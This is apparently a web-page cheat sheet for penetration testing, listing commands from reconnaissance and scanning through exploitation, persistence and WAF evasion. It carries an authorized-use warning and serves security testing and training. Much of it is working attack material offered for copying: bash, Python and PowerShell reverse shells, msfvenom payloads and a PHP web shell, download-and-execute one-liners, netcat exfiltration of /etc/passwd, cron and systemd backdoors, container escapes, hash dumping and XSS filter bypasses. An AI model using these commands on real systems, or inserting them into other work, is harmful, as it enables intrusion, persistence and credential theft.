Penetration Testing & Vulnerability Research

A comprehensive reference for authorized security assessments — recon through post-exploitation, with beginner instructions and advanced techniques side by side. Click any code block to copy.

28 sections
120+ commands
40+ tools covered
Updated 2025
⚠️
AUTHORIZED USE ONLY These commands must only be used in lab environments or against systems you have explicit written authorization to test. Unauthorized access is illegal in all jurisdictions.

🟢 Quick Start Guide — For Beginners

1
Set up a safe lab environment Install Kali Linux in a VM (VirtualBox or VMware). Use platforms like TryHackMe or HackTheBox for legal targets. Never test without written permission.
2
Understand the methodology: Recon → Scan → Exploit → Report Every engagement starts with reconnaissance (passive info gathering), then active scanning, then controlled exploitation, then a written report. Never jump straight to exploitation.
3
Install core tools On Kali: most tools here are pre-installed. For others: sudo apt install <tool> or use pip/go install. Check each tool's docs for the latest install method.
4
Set your target variable first Many commands use $TARGET. Start every session with export TARGET=your.target.com or export TARGET=192.168.x.x to avoid typing it repeatedly.
5
Log everything Use script session.log to record your terminal session, or pipe commands with | tee output.txt. Timestamped logs are essential for professional reports.
6
Understand every command before running it Use man <tool> or <tool> --help to read docs. Never paste and run a command you don't understand — especially in privileged contexts.
No commands match your search. Try different keywords.
01 Recon & OSINT
OSINTRecon
▶
Footprinting, WHOIS, DNS lookups, and passive certificate data gathering.
📖 How this works: Passive recon means gathering information from public sources without sending packets to the target. Start here — it's legal, reveals a lot, and doesn't alert defenders. Use $TARGET as your domain variable throughout.
Set target variable — do this first every session
export TARGET=example.comcopy
WHOIS lookup — owner, registrar, registration date, name servers
whois $TARGETcopy
DNS records — A (IP), MX (mail), NS (name servers), TXT (SPF/DMARC)
dig +noall +answer $TARGET A
dig +noall +answer $TARGET MX
dig +noall +answer $TARGET NS
dig +noall +answer $TARGET TXTcopy
Zone transfer attempt — check if DNS is misconfigured (often blocked, but worth trying)
dig axfr $TARGET @ns1.$TARGETcopy
HTTP headers — reveals server software, security headers, redirect chains
curl -sI -L --max-redirs 5 https://$TARGETcopy
Passive subdomain/cert data from crt.sh (no direct target contact)
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" \
  | jq -r '.[].name_value' | sort -u | grep -v '\*'copy
theHarvester — aggregate OSINT from Google, Bing, LinkedIn, Hunter.io
theHarvester -d $TARGET -b google,bing,linkedin,hunter -l 500 -f results.htmlcopy
Shodan CLI — find internet-exposed services for an IP (requires free API key)
shodan host 1.2.3.4
shodan search "hostname:$TARGET" --fields ip_str,port,org,productcopy
FOCA / Metagoofil — extract metadata from public documents
metagoofil -d $TARGET -t pdf,docx,xlsx -l 50 -o ./meta-results/copy
Wayback Machine — find old pages, endpoints, parameters (via waybackurls)
echo $TARGET | waybackurls | sort -u | tee wayback.txt
# Filter for interesting extensions:
cat wayback.txt | grep -E '\.(php|asp|aspx|env|config|bak|sql)'copy
02 Search Engine Dorking & Exposed Assets
OSINTDorking
▶
Using advanced search operators (dorks) to discover exposed files, panels, and misconfigurations indexed by search engines.
📖 How to use dorks: Paste these directly into Google, Bing, or Yandex. Replace target.com with your authorized target. Use GHDB for a full database of dorks.
Find sensitive documents on the target domain
site:target.com filetype:pdf "confidential"
site:target.com filetype:xls OR filetype:xlsx "password"
site:target.com filetype:sqlcopy
Find exposed admin/login panels
intitle:"login" inurl:admin site:target.com
intitle:"admin panel" site:target.com
inurl:"/wp-admin" site:target.comcopy
Find configuration/environment files
inurl:.env filetype:txt
inurl:wp-config.php
intitle:"index of /" ".env"copy
Find directory listings
intitle:"index of /" site:target.com
intitle:"index of /" "backup"copy
GitHub dorks — find leaked secrets in code repos
"AKIA" filename:.env site:github.com
"aws_secret_access_key" site:github.com
"password" filename:config.yml site:github.comcopy
Shodan dorks — search for specific banners
org:"Target Corp" port:22
hostname:target.com product:"Apache httpd"
net:1.2.3.0/24 vuln:CVE-2021-44228copy
03 Cloud Recon (AWS / Azure / GCP)
CloudOSINT
▶
Discovering exposed cloud storage, misconfigured buckets, and cloud-specific attack surfaces across the three major providers.
📖 Common cloud misconfigs: Public S3 buckets, open Azure blobs, and GCS buckets are frequent findings. DNS records often reveal cloud services the target uses. Tools like cloud_enum automate enumeration across all three providers.
cloud_enum — enumerate across AWS, Azure, GCP simultaneously
python3 cloud_enum.py -k target-company -l ./cloud-results.txtcopy
AWS — check if S3 bucket is public
# Try direct URL access:
curl -s https://target-bucket.s3.amazonaws.com/
# List bucket contents if public:
aws s3 ls s3://target-bucket --no-sign-request
aws s3 cp s3://target-bucket/sensitive-file.txt . --no-sign-requestcopy
AWS — enumerate with ScoutSuite (requires credentials)
python3 scout.py aws --report-dir ./scout-report/ --no-browsercopy
AWS — check for SSRF via metadata endpoint (from inside an EC2)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/copy
Azure — enumerate blobs and storage accounts
curl -s "https://target.blob.core.windows.net/\$web?restype=container&comp=list"
# MicroBurst: enumerate Azure
Import-Module MicroBurst.psm1; Invoke-EnumerateAzureBlobs -Base targetcopy
GCP — check for public GCS buckets
curl -s "https://storage.googleapis.com/target-bucket/"
gsutil ls -r gs://target-bucket/ 2>/dev/nullcopy
DNS — detect cloud CNAME takeover vectors
dig CNAME $TARGET | grep -E 's3|azure|github|heroku|shopify'
# subjack: automated subdomain takeover check
subjack -w subdomains.txt -t 100 -timeout 30 -o takeover.txt -sslcopy
04 Subdomain & DNS Enumeration
DNSSubdomain
▶
Discovering subdomains using passive APIs, active brute-force, and DNS record analysis — expanding the attack surface.
📖 Strategy: Combine passive tools (subfinder, amass passive) with active brute-force (ffuf, dnsrecon) for maximum coverage. Always resolve discovered subdomains to IPs with httpx to find live targets before scanning further.
Subfinder — fast passive subdomain discovery via public APIs
subfinder -d $TARGET -all -recursive -o subfinder.txt
subfinder -d $TARGET -silent | httpx -silent -title -status-codecopy
Amass — comprehensive passive + active + brute-force enum
amass enum -passive -d $TARGET -o amass-passive.txt
amass enum -active -brute -d $TARGET -o amass-active.txt -config config.inicopy
Assetfinder — find subdomains using various certificate/DNS sources
assetfinder --subs-only $TARGET | tee assetfinder.txtcopy
Combine + deduplicate all results, then check which are alive
cat subfinder.txt amass-passive.txt assetfinder.txt | sort -u > all-subs.txt
cat all-subs.txt | httpx -silent -status-code -title -tech-detect -o live-subs.txtcopy
DNS brute-force with puredns (uses massdns backend — very fast)
puredns bruteforce /usr/share/wordlists/dns/subdomains-top1mil.txt $TARGET \
  -r resolvers.txt -o puredns.txtcopy
dnsrecon — standard, SRV, and zone transfer checks
dnsrecon -d $TARGET -t std,brt,srv,axfr --xml dnsrecon.xmlcopy
05 Network Scanning & SMB/AD
NetworkAD
▶
Port scanning, service detection, and initial Active Directory enumeration. The foundation of every internal network pentest.
📖 Nmap flag cheatsheet: -sC = default scripts, -sV = version detection, -p- = all 65535 ports, -T4 = aggressive timing, -oA = output in all formats. For stealth use -sS -T2 --randomize-hosts.
Nmap — fast discovery scan (top 1000 ports first, then full)
# Quick initial scan:
nmap -sC -sV -T4 --open -oA nmap-quick 192.168.1.0/24
# Full port scan on interesting hosts:
nmap -sC -sV -p- -T4 --min-rate 2000 -oA nmap-full 192.168.1.10copy
Nmap — NSE script categories for deeper checks
nmap --script=vuln -p 80,443,21,22,25 192.168.1.10
nmap --script=http-enum,http-methods -p 80,8080,443 192.168.1.10
nmap --script=smb-vuln* -p 445 192.168.1.10copy
Masscan — ultra-fast port scan across large ranges (then verify with nmap)
masscan -p1-65535 192.168.1.0/24 --rate=10000 -oL masscan.txt
# Feed masscan results back to nmap for service detection:
awk '/open/{print $4}' masscan.txt | sort -u > live-hosts.txt
nmap -sV -sC -iL live-hosts.txt -oA nmap-servicescopy
SMB enumeration — shares, users, sessions
smbclient -L //192.168.1.10 -N
enum4linux -a 192.168.1.10
crackmapexec smb 192.168.1.10 --shares -u '' -p ''copy
LDAP / Active Directory initial enumeration
ldapsearch -x -H ldap://192.168.1.10 -b "DC=domain,DC=local" "(objectClass=*)"
nmap -p 88,389,445 --script=krb5-enum-users \
  --script-args userdb=users.txt 192.168.1.10copy
BloodHound data collection (requires domain credentials)
# Python-based collector (SharpHound alternative):
bloodhound-python -d domain.local -u user -p 'Pass123' -ns 192.168.1.10 -c All
# Then import the .zip into BloodHound GUI to visualize attack pathscopy
06 Web Discovery & Fuzzing
WebFuzzing
▶
Brute-forcing directories, files, virtual hosts, and API endpoints to find hidden functionality.
📖 Key flags: -mc = match HTTP codes, -fc = filter codes, -fs = filter by response size, -fw = filter by word count. Use -t 50 for speed (threads). Wordlists: SecLists at /usr/share/seclists/.
ffuf — directory and file discovery
ffuf -u https://$TARGET/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -mc 200,201,301,302,403 -t 50 -o ffuf-dirs.jsoncopy
ffuf — file extension bruteforce (find backups, configs)
ffuf -u https://$TARGET/indexFUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt \
  -mc 200,403 -t 40copy
ffuf — VHost fuzzing (find hidden virtual hosts)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.$TARGET" -u https://$TARGET/ \
  -fs 4242 -mc 200,301,302 -o vhosts.jsoncopy
gobuster — API endpoint discovery
gobuster dir -u https://api.$TARGET/v1/ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -x json -o api-gobuster.txtcopy
feroxbuster — recursive content discovery (auto-follows dirs)
feroxbuster -u https://$TARGET -w \
  /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,js --depth 3 -o feroxbuster.txtcopy
katana — crawl JS-heavy SPAs and extract endpoints
katana -u https://$TARGET -jc -d 5 -o katana-urls.txt
# Extract unique params from crawled URLs:
cat katana-urls.txt | grep '?' | unfurl --unique keyscopy
07 Web App & API Security Testing
SQLiXSSAPI
▶
Testing for OWASP Top 10 vulnerabilities: SQLi, XSS, SSRF, IDOR, XXE, and more. Lab/authorized use only.
📖 Testing workflow: Use a proxy (Burp Suite Community is free). Intercept requests, send to Repeater for manual testing, Intruder for fuzzing. Always test in a browser with Burp's CA cert installed. sqlmap --risk=1 --level=1 for safe automated testing.
Nikto — web server misconfiguration and vulnerability scanner
nikto -h https://$TARGET -output nikto.html -Format htm -Tuning 1234567890copy
sqlmap — automated SQL injection detection and exploitation
# Basic test:
sqlmap -u "https://$TARGET/page?id=1" --batch --dbs --level=2
# Test with Burp-captured request:
sqlmap -r request.txt --batch --dbs --technique=BEUSTQ
# POST data test:
sqlmap -u "https://$TARGET/login" --data="user=test&pass=test" --batchcopy
dalfox — XSS scanning (faster than manual, supports blind XSS)
dalfox url "https://$TARGET/search?q=test" --blind https://xss.report/c/your-id
cat urls.txt | dalfox pipe -o xss-results.txtcopy
SSRF testing — use Burp Collaborator or interactsh as callback
# Start interactsh server (open source Burp Collaborator alternative):
interactsh-client -v
# Then use the generated URL in SSRF payloads:
curl -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://abcdef.oast.fun"}' https://$TARGET/api/fetchcopy
Arjun — hidden HTTP parameter discovery
arjun -u "https://$TARGET/api/endpoint" --stable -oJ params.json
# Test POST params too:
arjun -u "https://$TARGET/login" -m POST --stablecopy
nuclei — templated vulnerability scanning for web apps
nuclei -u https://$TARGET -t exposures/ -t vulnerabilities/ -o nuclei-web.txt
nuclei -u https://$TARGET -t cves/ -severity critical,high -o nuclei-cves.txtcopy
JWT testing — decode and check for weak secrets or algorithm confusion
# Decode JWT (base64 decode each part):
echo "eyJhbGci..." | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# Crack JWT secret with hashcat (mode 16500):
hashcat -a 0 -m 16500 "eyJhbGci..." /usr/share/wordlists/rockyou.txtcopy
08 Vulnerability Scanning & SCA
CVESBOM
▶
Automated CVE scanning with templates, software bill of materials generation, and dependency vulnerability analysis.
📖 SCA explained: Software Composition Analysis (SCA) finds vulnerable open-source dependencies. Generate a SBOM (Software Bill of Materials) with Syft, then scan it with Grype. This is crucial for supply-chain security assessments.
nuclei — scan list of hosts with CVE templates
nuclei -l hosts.txt -t cves/ -severity critical,high,medium \
  -rl 50 -o nuclei-results.txt -json | jq '.info.severity, .matched-at'copy
OpenVAS / GVM — full vulnerability scan (run via docker)
docker run -d -p 443:443 --name openvas mikesplain/openvas
# Access at https://127.0.0.1 — default: admin/admincopy
Syft — generate SBOM from a project directory or container image
syft packages dir:./project -o cyclonedx-json > sbom.json
syft packages docker:myapp:latest -o spdx-json > sbom-docker.jsoncopy
Grype — scan SBOM against known CVE databases
grype sbom:sbom.json --fail-on high
grype dir:./project -o tablecopy
Trivy — all-in-one container and filesystem scanner
trivy image nginx:latest --severity HIGH,CRITICAL
trivy fs ./project/ --security-checks vuln,secret,configcopy
09 Passwords & AD / Kerberos
PasswordsAD
▶
Online brute-force (authorized only), offline hash cracking, and Active Directory-specific attacks.
📖 Hash mode reference (hashcat -m): 0=MD5, 100=SHA1, 1000=NTLM, 3200=bcrypt, 13100=Kerberos TGS-REP (Kerberoasting), 18200=Kerberos AS-REP, 16500=JWT. Always use --force only if hashcat errors about weak hash types.
Hydra — online brute-force (use carefully, causes lockouts)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  -t 4 -f ssh://192.168.1.10
hydra -l admin -P passwords.txt http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"copy
hashcat — GPU-accelerated offline hash cracking
# NTLM (Windows hashes from secretsdump):
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
# With rules (vastly increases coverage):
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rulecopy
Kerberoasting — request TGS tickets for service accounts, crack offline
# Requires domain user credentials:
GetUserSPNs.py domain.local/user:Pass123 -dc-ip 192.168.1.10 \
  -request -output-file kerberoast-hashes.txt
# Crack with hashcat mode 13100:
hashcat -m 13100 kerberoast-hashes.txt /usr/share/wordlists/rockyou.txtcopy
AS-REP Roasting — targets accounts with pre-auth disabled
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt \
  -dc-ip 192.168.1.10 -format hashcat -outputfile asrep-hashes.txt
hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txtcopy
impacket secretsdump — extract hashes from Windows (requires admin)
secretsdump.py domain/admin:Pass123@192.168.1.10 -outputfile secrets
# Use dumped hashes for pass-the-hash:
secretsdump.py -hashes :NTLM-HASH domain/admin@192.168.1.10copy
CrackMapExec — password spraying across the domain (use cautiously)
# Spray a single password across all hosts (watch for lockout policy!):
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' \
  --continue-on-successcopy
10 Metasploit & Exploit Consoles
ExploitMSF
▶
Core Metasploit Framework commands for searching, configuring, and executing exploits. Lab use only.
📖 MSF workflow: msfconsole → search → use → show options → set required options → check (if available) → run. The db_nmap command runs nmap and stores results in MSF's database for easy pivoting.
Start msfconsole with database (workspace per engagement)
msfdb init && msfconsole
# Inside MSF: create a workspace per engagement:
workspace -a client_name_2025
db_nmap -sV -p- 192.168.1.0/24copy
Search and use an exploit
search cve:2017-0143
search eternalblue type:exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
check
runcopy
Meterpreter — post-exploitation commands
# After getting a meterpreter session:
sysinfo          # system info
getuid           # current user
getsystem        # attempt privilege escalation
hashdump         # dump NTLM hashes
run post/multi/recon/local_exploit_suggester  # find local exploits
upload /path/to/tool.exe C:\\Windows\\Temp\\
download C:\\Users\\user\\Desktop\\file.txt ./copy
Auxiliary modules — scanners and info-gathering
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/http/dir_scannercopy
11 Post-Exploitation: Reverse Shells & Enum
ShellPrivesc
▶
Setting up listeners, spawning stable shells, and initial host enumeration after gaining access.
📖 Shell stability: Raw netcat shells are fragile (no tab completion, CTRL+C kills the shell). Upgrade with: python3 -c 'import pty;pty.spawn("/bin/bash")', then CTRL+Z, stty raw -echo; fg, then export TERM=xterm.
Netcat listener — catch reverse shells
nc -lvnp 4444
# rlwrap adds readline history to nc (install: apt install rlwrap):
rlwrap nc -lvnp 4444copy
Bash reverse shell
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1copy
Python reverse shell (stable PTY)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.5",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'copy
PowerShell reverse shell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.0.0.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write([Text.Encoding]::ASCII.GetBytes($r),0,$r.Length)}"copy
Upgrade shell to PTY (run on target after getting netcat shell)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then on your machine: CTRL+Z, then:
stty raw -echo; fg
# Back in shell:
export TERM=xterm; export SHELL=bash; stty rows 40 cols 200copy
LinPEAS — automated Linux privilege escalation enumeration
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or transfer and run:
chmod +x linpeas.sh && ./linpeas.sh | tee linpeas-output.txtcopy
WinPEAS — automated Windows privilege escalation check
# Download from releases, then run on Windows target:
.\winPEASx64.exe all > winpeas-output.txtcopy
12 Network & TLS Checks
NetworkTLS
▶
Traffic capture, packet analysis, and SSL/TLS configuration auditing.
tcpdump — capture traffic to file, then analyze offline
tcpdump -i eth0 -w capture.pcap -c 5000
tcpdump -i eth0 'port 80 or port 443' -w http-traffic.pcapcopy
tshark — command-line Wireshark for analysis
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri -e http.request.method
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.argcopy
sslyze — comprehensive TLS/SSL configuration audit
sslyze --regular $TARGET:443 --json_out=sslyze.jsoncopy
testssl.sh — check for weak ciphers, BEAST, POODLE, HEARTBLEED
./testssl.sh --quiet --color 0 --logfile testssl.log https://$TARGETcopy
Responder — poison LLMNR/NBT-NS to capture NTLMv2 hashes (internal network)
# LAB/AUTHORIZED ONLY — this affects all machines on the segment:
responder -I eth0 -wrf
# Captured hashes appear in /usr/share/responder/logs/copy
13 Vulnerability Research & PoC Triage
VulnResPoC
▶
Searching exploit databases and safely running proof-of-concept code in network-isolated containers.
📖 Safe PoC testing: Always run untrusted PoC code inside a Docker container with --network none to prevent accidental outbound connections. Read every line of a PoC before running it — malicious PoCs exist that target researchers.
searchsploit — search local ExploitDB copy
searchsploit "CVE-2021-44228"
searchsploit apache 2.4 --exclude="dos"
searchsploit -m 49993  # copy exploit to current dir by EDB-ID
searchsploit -x 49993  # examine without copyingcopy
Run PoC in isolated container (no network, no host access)
docker run --rm -v /tmp/poc.py:/poc/poc.py \
  --network none --cap-drop ALL \
  -it python:3.11-slim bash -c "pip install requests -q && python /poc/poc.py"copy
CVE research — useful resources to check
# Check NVD for CVSS score and description:
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228" | jq '.vulnerabilities[0].cve.descriptions[0].value'
# Check GitHub for PoC:
# https://github.com/search?q=CVE-2021-44228+poc&type=repositoriescopy
14 Binary Reversing & Exploit Development
ReversePwn
▶
Static analysis of ELF/PE binaries, ROP chain building, and interactive debugging with GDB/pwndbg.
📖 Reversing workflow: file binary → checksec binary (check protections) → strings → ltrace/strace → objdump/ghidra → gdb for dynamic analysis. Install pwndbg: git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh
Initial binary triage
file ./binary
checksec --file=./binary  # check ASLR, NX, PIE, stack canary
strings ./binary | grep -E 'pass|key|secret|flag|http'
ltrace ./binary 2>&1 | head -50
strace ./binary 2>&1 | head -50copy
objdump / readelf — static disassembly and ELF info
readelf -h ./binary    # ELF headers
readelf -S ./binary    # sections
objdump -d ./binary | grep -A 20 "<main>"copy
ROPgadget — find ROP gadgets for bypass of NX/W^X
ROPgadget --binary ./binary --only "pop|ret" > gadgets.txt
ROPgadget --binary ./binary --rop --chain "execve"copy
GDB with pwndbg — interactive debugging
gdb -q ./binary
# Inside gdb (pwndbg commands):
# start    — run to main
# disass main — disassemble main
# cyclic 200 — generate cyclic pattern for buffer overflow offset
# cyclic -l 0x6161616b — find offset where crash occurredcopy
Ghidra — headless decompilation (GUI is better, but CLI is scriptable)
analyzeHeadless /tmp/ghidra-project MyProject -import ./binary \
  -postScript DecompileFunction.java main -scriptPath /opt/ghidra/Ghidra/Features/Decompiler/copy
15 Fuzzing
Fuzzing
▶
Binary fuzzing for crash discovery and HTTP fuzzing for input validation testing.
📖 AFL++ vs libFuzzer: AFL++ works on any binary via instrumentation or black-box mode. libFuzzer requires source code and is faster for in-process fuzzing. Use AFL++ for external programs, libFuzzer for library APIs. Both find crashes you can turn into CVEs.
AFL++ — instrument and fuzz a binary
# Compile with AFL instrumentation:
CC=afl-clang-fast CXX=afl-clang-fast++ ./configure && make
# Run fuzzer with initial corpus:
afl-fuzz -i ./corpus/ -o ./findings/ -- ./target @@
# Check coverage and crashes:
afl-whatsup ./findings/copy
libFuzzer — in-process fuzzing (requires source, LLVM)
clang -g -fsanitize=fuzzer,address -o fuzz_target fuzz_target.c target_lib.a
./fuzz_target -max_total_time=300 ./corpus/copy
wfuzz — HTTP parameter and header fuzzing
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \
  --hc 404,500 "https://$TARGET/search?q=FUZZ"copy
16 Mobile & Firmware Analysis
MobileFirmware
▶
APK decompilation, dynamic runtime instrumentation (Frida), and embedded firmware extraction.
📖 Android testing setup: Use an Android emulator (AVD) or rooted device. Install Burp's CA cert to the system trust store for HTTPS interception. Bypass certificate pinning with Frida or Objection: objection -g com.app.name explore, then android sslpinning disable.
jadx — decompile APK to readable Java/Kotlin source
jadx -d ./output/ app.apk
jadx-gui app.apk  # graphical interface
# Search for hardcoded secrets in decompiled source:
grep -r "api_key\|secret\|password\|token" ./output/ --include="*.java"copy
apktool — decompile, modify, repackage APK
apktool d app.apk -o ./apk-decoded/
# After modifications:
apktool b ./apk-decoded/ -o app-patched.apk
jarsigner -keystore my.keystore app-patched.apk alias_namecopy
Frida — dynamic hooking and SSL pinning bypass
frida -U -f com.example.app --no-pause -l hook-script.js
# SSL pinning bypass with Objection:
objection -g com.example.app explore
# Inside objection shell:
android sslpinning disablecopy
binwalk — firmware analysis and extraction
binwalk -e firmware.bin -C ./firmware-extracted/
strings firmware.bin | grep -iE 'password|admin|telnet|ssh|key'
# Check extracted filesystem for config files:
find ./firmware-extracted/ -name "*.conf" -o -name "*.cfg" | xargs grep -l "pass"copy
17 Container & Kubernetes Security
DockerK8s
▶
Container escape vectors, Docker daemon misconfigurations, and Kubernetes RBAC and pod security checks.
📖 Common container escapes: (1) Privileged container + mount host FS, (2) docker socket mounted in container, (3) hostPID/hostNetwork enabled, (4) writable host path mounts. Always check with cat /proc/1/cgroup to confirm you're in a container.
Detect if running inside a container
cat /proc/1/cgroup | grep -i docker
ls /.dockerenv 2>/dev/null && echo "In Docker"
cat /proc/self/status | grep CapEff  # check capabilitiescopy
Docker escape via privileged container + host mount
# If running as privileged, mount the host filesystem:
fdisk -l  # find host disk
mkdir /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host bash  # now you have host root accesscopy
Docker socket escape — if /var/run/docker.sock is mounted
ls /var/run/docker.sock && echo "Socket available!"
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | jq '.[].RepoTags'
# Create privileged container from inside:
curl -s --unix-socket /var/run/docker.sock -X POST \
  "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu","Binds":["/:/host"],"Privileged":true}'copy
Kubernetes — enumeration and privilege escalation
kubectl get pods -A
kubectl get secrets -A
kubectl auth can-i --list  # what can the current SA do?
kubectl exec -it <pod> -- /bin/bash
# Check if service account token is mounted:
cat /run/secrets/kubernetes.io/serviceaccount/tokencopy
kube-bench — CIS Kubernetes benchmark audit
docker run --rm -v /etc:/etc:ro -v /var:/var:ro \
  -v $(which kubectl):/usr/local/mount-from-host/bin/kubectl \
  --pid=host aquasec/kube-bench:latestcopy
18 Evasion & msfvenom Payloads
ExploitEvasion
▶
Generating and encoding payloads with msfvenom. Authorized use only.
📖 Format guide: -f exe = Windows executable, -f raw = shellcode bytes, -f py = Python array, -f elf = Linux binary, -f asp/-f php = web shells. Use -e x86/shikata_ga_nai -i 5 for encoding (note: most modern AVs detect this).
Windows x64 reverse shell (stageless)
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -f exe -o shell_x64.execopy
Windows Meterpreter (staged, encoded)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -e x64/xor_dynamic -i 3 \
  -f exe -o payload-enc.execopy
Linux ELF reverse shell
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -f elf -o shell.elf && chmod +x shell.elfcopy
PHP web shell (for file upload exploits)
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -f raw > shell.phpcopy
List all payloads for a platform
msfvenom -l payloads | grep "windows/x64"
msfvenom -l encoderscopy
19 File Transfer
PayloadExfil
▶
Transferring tools and data between attacker and compromised hosts using native binaries.
📖 Choose your method: If HTTP is allowed outbound, use Python's HTTP server + curl/wget. If only DNS is allowed, use dnscat2. On Windows, PowerShell IEX or certutil are commonly available. impacket-smbserver works well for Windows-to-Linux transfers.
Attacker: serve files via Python HTTP server
python3 -m http.server 8080
# With auth (Python 3.x):
python3 -m http.server 8080 --bind 10.0.0.5copy
Target (Linux): download files
wget http://10.0.0.5:8080/linpeas.sh -O /tmp/linpeas.sh
curl -sO http://10.0.0.5:8080/tool
# In-memory execution (no file on disk):
curl -s http://10.0.0.5:8080/script.sh | bashcopy
Target (Windows): multiple download methods
# PowerShell (most common):
IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5:8080/shell.ps1')
(New-Object Net.WebClient).DownloadFile('http://10.0.0.5:8080/nc.exe','C:\Temp\nc.exe')
# certutil (often allowed by AV):
certutil -urlcache -split -f http://10.0.0.5:8080/payload.exe C:\Temp\p.exe
# bitsadmin:
bitsadmin /transfer myJob http://10.0.0.5:8080/tool.exe C:\Temp\tool.execopy
SMB share (Impacket) — great for Windows targets
impacket-smbserver share $(pwd) -smb2support -username user -password pass
# On Windows target:
net use Z: \\10.0.0.5\share /user:user pass
copy Z:\tool.exe C:\Temp\copy
Netcat file transfer
# Receiver (attacker):
nc -lvnp 8888 > received-file.db
# Sender (target):
nc 10.0.0.5 8888 < /etc/passwdcopy
20 Tunneling & Pivoting
NetworkPivot
▶
Routing traffic through a compromised host to reach otherwise inaccessible internal network segments.
📖 Pivoting concepts: A pivot is using a compromised host as a relay. Local port forward = your local port → target internal service. Reverse tunnel = internal host connects out to you. SOCKS proxy = route all your tools' traffic through the pivot using proxychains.
SSH local port forward (access internal service through SSH jump)
ssh -L 8080:192.168.1.10:80 user@jumpbox.corp -N
# Now browse http://localhost:8080 to reach 192.168.1.10:80copy
SSH dynamic SOCKS proxy (route all traffic via proxychains)
ssh -D 1080 user@jumpbox.corp -N -f
# Configure /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -p 22,80,443 192.168.1.0/24copy
Chisel — fast HTTP tunnel (works through web proxies)
# Attacker (SOCKS server):
./chisel server -p 8000 --socks5 --reverse
# Target (connect back and create SOCKS):
./chisel client 10.0.0.5:8000 R:1080:sockscopy
Ligolo-ng — modern transparent tunneling proxy
# Attacker:
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert
# Target:
./agent -connect 10.0.0.5:11601 -ignore-cert
# In ligolo console: session → start → add routes on attacker
sudo ip route add 192.168.1.0/24 dev ligolocopy
21 Persistence & Backdoors
PersistenceBackdoor
▶
Adversary persistence techniques. Defensive education: know these to detect and hunt them.
Linux cron job persistence
# User crontab:
(crontab -l; echo "* * * * * /tmp/.hidden/backdoor") | crontab -
# System crontab (requires root):
echo '*/5 * * * * root bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' >> /etc/crontabcopy
Linux SSH authorized_keys persistence
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-rsa AAAAB3Nz..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keyscopy
Linux systemd service persistence
cat > /etc/systemd/system/svc.service << EOF
[Unit]
Description=System Service
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable svc.service && systemctl start svc.servicecopy
Windows registry Run key persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v "WindowsUpdate" /t REG_SZ \
  /d "C:\Users\user\AppData\Local\Temp\payload.exe" /fcopy
Windows scheduled task persistence
schtasks /create /sc minute /mo 5 /tn "WindowsDefender" \
  /tr "C:\Temp\payload.exe" /ru SYSTEMcopy
22 WAF / IDPS Evasion
EvasionWeb
▶
Encoding and obfuscation techniques to bypass web application firewalls during authorized testing.
XSS — case variation and entity encoding to bypass filters
<ScRiPt>alert(document.domain)</ScRiPt>
<img src=x onerror="alert(1)">
<svg onload=alert`1`>
<details open ontoggle=alert(1)>copy
